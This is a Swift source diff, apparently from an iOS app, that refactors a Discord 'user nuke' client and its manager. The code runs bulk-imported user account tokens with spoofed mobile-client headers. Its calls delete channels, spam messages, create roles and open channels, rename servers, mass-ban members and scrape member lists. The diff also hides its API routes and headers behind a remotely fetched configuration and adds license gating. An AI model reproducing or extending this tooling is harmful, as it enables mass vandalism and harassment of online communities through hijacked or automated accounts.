@@ -1838,22 +1838,17 @@ class BotClient {
 // MARK: - USER NUKE CLIENT
 // ==========================================
 class UserNukeClient {
-    let token: String; let session: URLSession
-    static var EVERYONE_ALLOW: UInt64 { AppEndpoints.everyoneAllow }
-    init(token: String) {
+    let token: String
+    let scope: FeatureScope
+    let session: URLSession
+    var everyoneAllow: UInt64 { RemoteFeatureVault.shared.everyoneAllow(scope: scope) }
+
+    init(token: String, scope: FeatureScope = .userNuke) {
         self.token = token
-        let cfg = URLSessionConfiguration.default; cfg.timeoutIntervalForRequest = 30
-        cfg.httpAdditionalHeaders = [
-            "Authorization": token,
-            "Content-Type": "application/json",
-            "User-Agent": AppEndpoints.userAgentMobile,
-            "X-Super-Properties": AppEndpoints.superPropertiesMobile,
-            "X-Discord-Locale": "en-US",
-            "X-Discord-Timezone": "Asia/Ho_Chi_Minh",
-            "X-Context-Properties": "e30=",
-            "Origin": AppEndpoints.origin,
-            "Referer": AppEndpoints.referer
-        ]
+        self.scope = scope
+        let cfg = URLSessionConfiguration.default
+        cfg.timeoutIntervalForRequest = 30
+        cfg.httpAdditionalHeaders = RemoteFeatureVault.shared.mobileHeaders(scope: scope, token: token)
         session = URLSession(configuration: cfg)
     }
     private func check(_ res: URLResponse, _ data: Data) throws {
@@ -1863,64 +1858,79 @@ class UserNukeClient {
                 "HTTP \(h.statusCode): \(String(data: data, encoding: .utf8)?.prefix(200) ?? "")"])
         }
     }
-    func validate() async throws -> DiscordUser {
-        guard SecurityGuard.shared.verifyExecutionPermit() else {
-            throw NSError(domain: "UN", code: 403, userInfo: [NSLocalizedDescriptionKey: "Security permit invalid"])
+    private func requireURL(_ route: KeyPath<RemoteRoutesDTO, String?>, replacements: [String: String] = [:]) throws -> URL {
+        guard SecurityGuard.shared.verifyExecutionPermit(),
+              let url = RemoteFeatureVault.shared.makeURL(scope: scope, route: route, replacements: replacements) else {
+            throw NSError(domain: "UN", code: 403, userInfo: [NSLocalizedDescriptionKey: "Chưa xác thực chức năng từ máy chủ."])
         }
-        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/users/@me")!)
+        return url
+    }
+    func validate() async throws -> DiscordUser {
+        let url = try requireURL(\.me)
+        let (d, r) = try await session.data(from: url)
         try check(r, d); return try JSONDecoder().decode(DiscordUser.self, from: d)
     }
     func getGuildsWithPerms() async throws -> [NukeGuild] {
-        guard SecurityGuard.shared.verifyExecutionPermit() else { return [] }
-        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/users/@me/guilds")!)
+        let url = try requireURL(\.me_guilds)
+        let (d, r) = try await session.data(from: url)
         try check(r, d); return try JSONDecoder().decode([NukeGuild].self, from: d)
     }
     func getGuildDetail(_ g: String) async throws -> [String: Any] {
-        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)")!)
+        let url = try requireURL(\.guild, replacements: ["guild_id": g])
+        let (d, r) = try await session.data(from: url)
         try check(r, d); return (try JSONSerialization.jsonObject(with: d) as? [String: Any]) ?? [:]
     }
     func getRoles(_ g: String) async throws -> [GuildRole] {
-        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/roles")!)
+        let url = try requireURL(\.guild_roles, replacements: ["guild_id": g])
+        let (d, r) = try await session.data(from: url)
         try check(r, d); return try JSONDecoder().decode([GuildRole].self, from: d)
     }
     func getMember(_ g: String, uid: String) async throws -> BotMember {
-        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/members/\(uid)")!)
+        let url = try requireURL(\.guild_member, replacements: ["guild_id": g, "user_id": uid])
+        let (d, r) = try await session.data(from: url)
         try check(r, d); return try JSONDecoder().decode(BotMember.self, from: d)
     }
     func getChannels(_ g: String) async throws -> [Channel] {
-        let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/channels")!)
+        let url = try requireURL(\.guild_channels, replacements: ["guild_id": g])
+        let (d, r) = try await session.data(from: url)
         try check(r, d); return try JSONDecoder().decode([Channel].self, from: d)
     }
     func deleteChannel(_ c: String) async throws {
-        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/channels/\(c)")!)
+        let url = try requireURL(\.channel, replacements: ["channel_id": c])
+        var req = URLRequest(url: url)
         req.httpMethod = "DELETE"; let (d, r) = try await session.data(for: req); try check(r, d)
     }
     func createChannel(_ g: String, name: String, openEveryone: Bool) async throws -> String? {
-        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/channels")!)
+        let url = try requireURL(\.guild_channels, replacements: ["guild_id": g])
+        var req = URLRequest(url: url)
         req.httpMethod = "POST"
         var p: [String: Any] = ["name": name, "type": 0]
-        if openEveryone { p["permission_overwrites"] = [["id": g, "type": 0, "allow": String(UserNukeClient.EVERYONE_ALLOW), "deny": "0"]] }
+        if openEveryone { p["permission_overwrites"] = [["id": g, "type": 0, "allow": String(everyoneAllow), "deny": "0"]] }
         req.httpBody = try JSONSerialization.data(withJSONObject: p)
         let (d, r) = try await session.data(for: req); try check(r, d)
         return (try? JSONSerialization.jsonObject(with: d) as? [String: Any])?["id"] as? String
     }
     func sendMessage(_ c: String, content: String) async throws {
-        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/channels/\(c)/messages")!)
+        let url = try requireURL(\.channel_messages, replacements: ["channel_id": c])
+        var req = URLRequest(url: url)
         req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["content": content])
         let (d, r) = try await session.data(for: req); try check(r, d)
     }
     func createRole(_ g: String, name: String) async throws {
-        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/roles")!)
+        let url = try requireURL(\.guild_roles, replacements: ["guild_id": g])
+        var req = URLRequest(url: url)
         req.httpMethod = "POST"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": name])
         let (d, r) = try await session.data(for: req); try check(r, d)
     }
     func renameGuild(_ g: String, newName: String) async throws {
-        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)")!)
+        let url = try requireURL(\.guild, replacements: ["guild_id": g])
+        var req = URLRequest(url: url)
         req.httpMethod = "PATCH"; req.httpBody = try JSONSerialization.data(withJSONObject: ["name": newName])
         let (d, r) = try await session.data(for: req); try check(r, d)
     }
     func banMember(_ g: String, uid: String) async throws {
-        var req = URLRequest(url: URL(string: "\(AppEndpoints.apiBase)/guilds/\(g)/bans/\(uid)")!)
+        let url = try requireURL(\.guild_ban, replacements: ["guild_id": g, "user_id": uid])
+        var req = URLRequest(url: url)
         req.httpMethod = "PUT"; req.httpBody = try JSONSerialization.data(withJSONObject: ["delete_message_seconds": 0])
         let (d, r) = try await session.data(for: req); try check(r, d)
     }
@@ -1933,7 +1943,8 @@ class UserNukeClient {
         let detail = try await getGuildDetail(guildId)
         let total = (detail["approximate_member_count"] as? Int) ?? (detail["member_count"] as? Int) ?? 1000
 
-        guard let url = URL(string: AppEndpoints.gatewayURL) else { return }
+        guard SecurityGuard.shared.verifyExecutionPermit(),
+              let url = RemoteFeatureVault.shared.gatewayURL(scope: scope) else { return }
         let ws = session.webSocketTask(with: url)
         ws.maximumMessageSize = 64 * 1024 * 1024
         ws.resume()
@@ -1953,9 +1964,11 @@ class UserNukeClient {
         }
         defer { hbTask.cancel() }
 
+        let gwProps = RemoteFeatureVault.shared.gatewayIdentifyProperties(scope: scope)
+        guard !gwProps.isEmpty else { return }
         let identify: [String: Any] = ["op": 2, "d": [
             "token": token, "capabilities": 125,
-            "properties": ["os": "iOS", "browser": "Safari", "device": "iPhone"],
+            "properties": gwProps,
             "compress": false,
             "presence": ["status": "online", "since": 0, "activities": [], "afk": false]
         ]]
@@ -2030,13 +2043,16 @@ class UserNukeClient {
         var after = "0"; var count = 0
         while !Task.isCancelled {
             do {
-                let (d, r) = try await session.data(from: URL(string: "\(AppEndpoints.apiBase)/guilds/\(guildId)/members?limit=1000&after=\(after)")!)
+                let url = try requireURL(\.guild_members, replacements: ["guild_id": guildId, "after": after])
+                let (d, r) = try await session.data(from: url)
                 guard let h = r as? HTTPURLResponse, h.statusCode == 200 else { return }
                 guard let arr = try? JSONSerialization.jsonObject(with: d) as? [[String: Any]], !arr.isEmpty else { return }
                 for m in arr { onMember(m) }
                 count += arr.count; onProgress(count)
                 if arr.count < 1000 { return }
-                after = ((arr.last?["user"] as? [String: Any])?["id"] as? String) ?? after
+                if let lastUser = arr.last?["user"] as? [String: Any], let lastId = lastUser["id"] as? String {
+                    after = lastId
+                }
                 try? await Task.sleep(nanoseconds: 500_000_000)
             } catch { return }
         }
@@ -2349,6 +2365,10 @@ class UserNukeManager: ObservableObject {
         guard !clean.isEmpty, !tokens.contains(where: { $0.token == clean }) else { return false }
         isImporting = true
         defer { isImporting = false }
+        guard await LicenseManager.shared.authorizeFeature(.userNuke) else {
+            importError = "Xác thực bản quyền thất bại."
+            return false
+        }
         do {
             let u = try await UserNukeClient(token: clean).validate()
             tokens.append(TokenInfo(token: clean, userId: u.id,
@@ -2381,6 +2401,10 @@ class UserNukeManager: ObservableObject {
             .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
             .filter { !$0.isEmpty }
         guard !lines.isEmpty else { importError = "Không có token"; return }
+        guard await LicenseManager.shared.authorizeFeature(.userNuke) else {
+            importError = "Xác thực bản quyền thất bại."
+            return
+        }
         isImporting = true; importError = nil
         if lines.count > 1 {
             BackgroundManager.shared.start(tag: "tokenCheck")
@@ -2440,13 +2464,20 @@ class UserNukeManager: ObservableObject {
     }
     func loadAllGuildsForSelected() async {
         isLoadingGuilds = true
+        guard await LicenseManager.shared.authorizeFeature(.userNuke) else {
+            isLoadingGuilds = false
+            return
+        }
         for id in selectedTokenIds {
             guard let t = tokens.first(where: { $0.id == id }), t.isValid else { continue }
-            await loadGuildsForToken(t)
+            await loadGuildsForToken(t, skipAuth: true)
         }
         recomputeEligible(); isLoadingGuilds = false
     }
-    private func loadGuildsForToken(_ t: TokenInfo) async {
+    private func loadGuildsForToken(_ t: TokenInfo, skipAuth: Bool = false) async {
+        if !skipAuth {
+            guard await LicenseManager.shared.authorizeFeature(.userNuke) else { return }
+        }
         do { tokenGuilds[t.id] = try await UserNukeClient(token: t.token).getGuildsWithPerms() }
         catch { tokenGuilds[t.id] = [] }
         recomputeEligible()
@@ -2502,6 +2533,10 @@ class UserNukeManager: ObservableObject {
         guard !selectedTokenIds.isEmpty else { return }
         let sel = tokens.filter { selectedTokenIds.contains($0.id) && $0.isValid }
         guard !sel.isEmpty else { return }
+        guard await LicenseManager.shared.authorizeFeature(.userNuke) else {
+            importError = "Xác thực bản quyền thất bại."
+            return
+        }
 
         isNuking = true; isCancelled = false; nukeLog = []; reset()
         BackgroundManager.shared.start(tag: "userNuke")
@@ -5584,7 +5619,7 @@ final class VoiceRoomManager: ObservableObject {
             return
         }
         do {
-            let all = try await UserNukeClient(token: token, scope: .voice).getChannels(guild.id)
+            let all: [Channel] = try await UserNukeClient(token: token, scope: .voice).getChannels(guild.id)
             let vcs = all.filter { $0.type == 2 || $0.type == 13 }.sorted { ($0.position ?? 0) < ($1.position ?? 0) }
             self.voiceChannels = vcs
             if let first = vcs.first {
@@ -8879,7 +8914,7 @@ struct VoiceGuildPickerSheet: View {
                 return
             }
             do {
-                let all = try await UserNukeClient(token: tok, scope: scope).getChannels(g.id)
+                let all: [Channel] = try await UserNukeClient(token: tok, scope: scope).getChannels(g.id)
                 let vcs = all.filter { $0.type == 2 || $0.type == 13 }.sorted { ($0.position ?? 0) < ($1.position ?? 0) }
                 await MainActor.run {
                     self.channels = vcs
